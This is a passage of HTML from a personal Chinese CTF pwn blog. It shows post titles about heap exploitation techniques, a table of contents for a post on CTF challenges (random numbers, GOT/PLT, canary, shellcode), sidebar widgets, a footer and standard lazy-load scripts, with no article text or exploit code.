alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-03</div><div class="title">0ctf_2017_babyheap--fastbin_attack</div></div></a></div><div><a href="/2024/10/08/House-Of-Orange/" title="House_Of_Orange"><img class="cover" src="/img/loading.gif" data-original="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-08</div><div class="title">House_Of_Orange</div></div></a></div><div><a href="/2024/09/02/ciscn-2019-n-3-uaf/" title="ciscn_2019_n_3-uaf"><img class="cover" src="/img/loading.gif" data-original="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-02</div><div class="title">ciscn_2019_n_3-uaf</div></div></a></div><div><a href="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/" title="PIE保护"><img class="cover" src="/img/loading.gif" data-original="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-31</div><div class="title">PIE保护</div></div></a></div><div><a href="/2024/09/01/ZJCTF-2019-EasyHeap-unlink/" title="ZJCTF_2019_EasyHeap-unlink"><img class="cover" src="/img/loading.gif" data-original="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-01</div><div class="title">ZJCTF_2019_EasyHeap-unlink</div></div></a></div><div><a href="/2024/09/03/hitcon2014-stkof-unlink/" title="hitcon2014_stkof-unlink"><img class="cover" src="/img/loading.gif" data-original="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-03</div><div class="title">hitcon2014_stkof-unlink</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/loading.gif" data-original="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">downbeat</div><div class="author-info__description">时刻保持谦逊</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://blog.csdn.net/zwb2603096342"><i class="iconfont icon-CSDN"></i><span>my Blog</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NotEnoughTime"><span class="toc-number">2.</span> <span class="toc-text">NotEnoughTime</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9Frandom%EF%BC%81"><span class="toc-number">3.</span> <span class="toc-text">这是什么？random！</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9FGOT%EF%BC%81"><span class="toc-number">4.</span> <span class="toc-text">这是什么？GOT！</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E8%A7%A3%E6%9E%90"><span class="toc-number">4.0.1.</span> <span class="toc-text">调用过程解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.0.2.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PLT-%E6%9C%BA%E5%88%B6%E6%A6%82%E8%BF%B0"><span class="toc-number">4.0.3.</span> <span class="toc-text">PLT 机制概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E6%83%85%E5%86%B5%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E8%B7%B3%E5%88%B0-0x401056-%E8%80%8C%E4%B8%8D%E6%98%AF-0x401050%EF%BC%9F"><span class="toc-number">4.0.4.</span> <span class="toc-text">具体情况：为什么跳到 0x401056 而不是 0x401050？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%E5%9B%9E%E9%A1%BE%EF%BC%9A"><span class="toc-number">4.0.4.1.</span> <span class="toc-text">汇编代码回顾：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%98%AF-0x401056%EF%BC%9F"><span class="toc-number">4.0.4.2.</span> <span class="toc-text">为什么是 0x401056？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">4.0.5.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Catch-the-canary"><span class="toc-number">5.</span> <span class="toc-text">Catch_the_canary!</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E9%9D%A2%E7%9C%8B%E5%A6%82%E4%BD%95%E8%B7%B3%E8%BF%87scanf%E8%BE%93%E5%85%A5%E7%9A%84"><span class="toc-number">5.1.</span> <span class="toc-text">下面看如何跳过scanf输入的</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#shellcode-revenge"><span class="toc-number">6.</span> <span class="toc-text">shellcode_revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E9%99%90%E5%AD%97%E8%8A%82shellcode%E5%86%8D%E6%AC%A1%E8%B0%83%E7%94%A8read"><span class="toc-number">6.1.</span> <span class="toc-text">有限字节shellcode再次调用read</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/10/15/moectf2024%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/" title="moectf2024知识点汇总"><img src="/img/loading.gif" data-original="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="moectf2024知识点汇总"/></a><div class="content"><a class="title" href="/2024/10/15/moectf2024%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/" title="moectf2024知识点汇总">moectf2024知识点汇总</a><time datetime="2024-10-15T09:56:24.000Z" title="发表于 2024-10-15 17:56:24">2024-10-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/14/%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B8%93%E9%A2%98/" title="随机数专题"><img src="/img/loading.gif" data-original="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="随机数专题"/></a><div class="content"><a class="title" href="/2024/10/14/%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B8%93%E9%A2%98/" title="随机数专题">随机数专题</a><time datetime="2024-10-14T03:54:21.000Z" title="发表于 2024-10-14 11:54:21">2024-10-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/08/House-Of-Orange/" title="House_Of_Orange"><img src="/img/loading.gif" data-original="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="House_Of_Orange"/></a><div class="content"><a class="title" href="/2024/10/08/House-Of-Orange/" title="House_Of_Orange">House_Of_Orange</a><time datetime="2024-10-08T10:35:05.000Z" title="发表于 2024-10-08 18:35:05">2024-10-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/26/House-Of-Force/" title="House_Of_Force"><img src="/img/loading.gif" data-original="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="House_Of_Force"/></a><div class="content"><a class="title" href="/2024/09/26/House-Of-Force/" title="House_Of_Force">House_Of_Force</a><time datetime="2024-09-26T04:49:57.000Z" title="发表于 2024-09-26 12:49:57">2024-09-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/25/zctf2016-note2-unlink/" title="zctf2016_note2-unlink(unlink精讲)"><img src="/img/loading.gif" data-original="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="zctf2016_note2-unlink(unlink精讲)"/></a><div class="content"><a class="title" href="/2024/09/25/zctf2016-note2-unlink/" title="zctf2016_note2-unlink(unlink精讲)">zctf2016_note2-unlink(unlink精讲)</a><time datetime="2024-09-25T10:55:36.000Z" title="发表于 2024-09-25 18:55:36">2024-09-25</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2024 By downbeat</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">CTF</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"></div><script type="text/javascript" src="/js/fairyDustCursor.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div>
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body></html>
